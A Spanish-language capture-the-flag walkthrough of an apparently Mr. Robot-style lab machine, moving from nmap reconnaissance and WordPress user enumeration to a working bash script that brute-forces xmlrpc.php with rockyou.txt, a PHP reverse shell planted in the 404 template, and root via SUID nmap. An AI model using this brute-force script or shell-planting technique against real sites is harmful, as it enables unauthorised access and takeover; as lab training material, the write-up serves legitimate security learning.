Hacemos el reconocimiento con nmap:
![[Pasted image 20230419170126.png]]
Y esta es la web que corre por el puerto 80:
![[Pasted image 20230419170359.png]]
Y también vemos que el puerto 443 está abierto, por lo que funciona con HTTPS:
![[Pasted image 20230505122341.png]]
Vamos a haer fuzzing, y podemos encontrar directorios web típicos de wordpress como el wp-content o license:
![[Pasted image 20230505130753.png]]
Entramos en el directorio de license, y abajo del todo nos encontramos con una contraseña en base64:
![[Pasted image 20230505130839.png]]
La decodificamos:
![[Pasted image 20230505130912.png]]
Vemos también que se trata de wordpress, por lo que yo se que hay un directorio que será el de wp-admin, por lo que probamos y funciona:
![[Pasted image 20230505123239.png]]
Y vemos que si ponemos un usuario que no existe, no va a funcionar, pero en cambio si ponemos un usuario que sí existe nos dice que la contraseña no es correcta, pero que el usuario sí, por lo que ya sabemos que el usuario es Elliot:
![[Pasted image 20230505123413.png]]
Vemos que si ponemos estas credenciales, ya estamos dentro:
![[Pasted image 20230505131025.png]]
No obstante, también podríamos hacer un ataque de fuerza bruta al fichero xmlrpc.xml. [[conocimiento/conocimiento/Hacking/Hacking Generico/Hacking Web/Hacking WordPress|Hacking WordPress]] de esta forma, por lo que primero lo enumeramos en el navegador:
![[Pasted image 20230505125232.png]]
Vamos a hacerle una petición por POST y veremos que funciona correctamente:
![[Pasted image 20230505125413.png]]
Y ahora que vemos que existe este fichero, buscamos en google como explotar vulnerabilidades haciendo uso de este fichero:
![[Pasted image 20230421133725.png]]
Y nos dicen que tenemos que tramitar esto:
![[Pasted image 20230421133752.png]]
```php
<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```
Por tanto pegamos este código en un fichero xml:
![[Pasted image 20230421133907.png]]
Y ahora este fichero lo tramitamos por POST contra el xmlrpc de wordpress y vemos que funciona:
![[Pasted image 20230505125633.png]]
Pero este es el más importante, porque aquí es donde podemos hacer el ataque de fuerza bruta:
![[Pasted image 20230505125655.png]]
Y podemos volver a editar el fichero xmlrpc pero esta vez añadiendo unas credenciales y veremos a ver qué nos muestra:
```php
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```
![[Pasted image 20230505131241.png]]
Donde vemos que nos indica que las credenciales son correctas:
![[Pasted image 20230505131319.png]]
En este punto podríamos hacer un ataque de fuerza bruta contra este login utilizando el siguiente script:
```php
#!/bin/bash

function salir() {
    exit 1
}

trap salir SIGINT

for i in $(cat rockyou.txt); do
    variable=$(cat <<FIN
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>Elliot</value></param> 
<param><value>$i</value></param> 
</params>     
</methodCall>
FIN
    )

    echo -e "$variable" >> enviar.xml
    echo -e "[+] Probamos con la contraseña $i"

    curl -s -X POST 'http://10.10.126.89/xmlrpc.php' -d@enviar.xml >> log.log

    if [ ! "$(cat log.log | grep 'Incorrect username or password.')" ]; then
         echo -e "[+] La contraseña para Elliot es $i"
         exit 0
    fi

    sleep 1

rm log.log enviar.xml

done
```
![[Pasted image 20230421143424.png]]

-------------------------------------------------------------

Una vez dentro de la máquina, podemos ir a la parte de appearence e ir a la parte de editor, para ediutar las distintas plantillas de la web:
![[Pasted image 20230506090051.png]]
Y ahora en github buscamos el código de cómo generar un php malicioso que nos proporcione una reverse shell:
![[Pasted image 20230506090127.png]]
Copiamos el contenido de este documento en la plantilla de 404 error found:
![[Pasted image 20230506090157.png]]
Y ahora si nos ponemos en escucha con netcat y ponemos alguna url errónea en el buscador, habremos recibido la reverse shell:
![[Pasted image 20230506090226.png]]
![[Pasted image 20230506090236.png]]
Una vez dentro, nos encontramos con este archivo:
![[Pasted image 20230506092540.png]]
El cual podemos pasarlo por john the ripper o por crackstation, donde vamos a obtener una contraseña:
![[Pasted image 20230506092608.png]]
Ahora, si intentamos cambiar de usuario empleando estas credenciales, nuevamente tenemos el problema de que la consola nos cierra la posibilidad de introducir datos, imposibilitando el poder realizar cualquier acción.
![[Pasted image 20230506095346.png]]
No obstante, podemos ejecutar un comando de Python para arreglar este problema, donde nos vamos a ganar una bash un poco más funcional donde sí podremos poner la ocntraseña del usuario robot; y el comando es este:
```python
python -c "import pty;pty.spawn('/bin/bash')"
```
![[Pasted image 20230506095546.png]]
Una vez siendo este usuario, podemos ver los permisos SUID, donde vemos que podemos ejecutar nmap:
![[Pasted image 20230506095752.png]]
Y lo interesante es que nmap tiene un modo interactivo, donde podemos ejecutar comandos; y como podemos ejecutar nmap como root, ya seremos usuarios root de esta forma:
![[Pasted image 20230506095901.png]]
En cuanto a la primera flag, está dentro del directorio web de robots.txt:
![[Pasted image 20230506100158.png]]
